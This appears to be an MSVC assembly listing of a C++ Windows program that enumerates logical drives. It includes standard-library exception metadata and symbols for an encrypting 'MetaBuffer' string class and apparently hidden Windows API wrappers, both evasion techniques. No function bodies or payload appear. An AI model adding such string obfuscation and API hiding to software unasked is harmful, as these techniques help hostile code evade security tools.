; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@ ; `string'
PUBLIC	??_C@_15GANGMFKL@?$AA?$CF?$AAs@			; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	free:PROC
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	__std_exception_copy:PROC
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	__std_exception_destroy:PROC
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_15GANGMFKL@?$AA?$CF?$AAs@
CONST	SEGMENT
??_C@_15GANGMFKL@?$AA?$CF?$AAs@ DB '%', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@
CONST	SEGMENT
??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@ DB 'F'
	DB	00H, 'o', 00H, 'u', 00H, 'n', 00H, 'd', 00H, ' ', 00H, '%', 00H
	DB	'd', 00H, ' ', 00H, 'd', 00H, 'r', 00H, 'i', 00H, 'v', 00H, 'e'
	DB	00H, 's', 00H, ':', 00H, ' ', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z	; std::forward<wchar_t * const &>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z	; std::_Deallocate<16,0>
PUBLIC	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??$_Convert_size@_K_K@std@@YA_K_K@Z		; std::_Convert_size<unsigned __int64,unsigned __int64>
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
PUBLIC	??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
PUBLIC	??0?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0drive_info_@filesystem@@QEAA@XZ		; filesystem::drive_info_::drive_info_
PUBLIC	?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z ; filesystem::EnumirateDrives
PUBLIC	?pGetLogicalDriveStringsW@@YAKKPEA_W@Z		; pGetLogicalDriveStringsW
PUBLIC	?plstrlenW@@YAHPEB_W@Z				; plstrlenW
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	?_Orphan_all@_Container_base0@std@@QEAAXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
